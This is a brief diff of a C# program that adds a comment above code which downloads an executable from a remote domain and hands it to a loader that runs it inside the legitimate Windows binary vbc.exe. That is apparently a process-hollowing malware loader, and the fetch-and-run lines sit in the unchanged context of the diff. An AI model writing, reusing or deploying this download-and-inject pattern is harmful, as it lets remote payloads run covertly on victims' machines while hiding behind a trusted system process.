@@ -10,6 +10,7 @@ namespace Native_From_Csharp
     {
         static void Main(string[] args)
         {
+            // this downloads a native file
             byte[] filearray = DownloadFile("https://floppa.xn--q9jyb4c/ConsoleApplication1.exe");
             loader.loader.Run(filearray, @"C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe");
         }
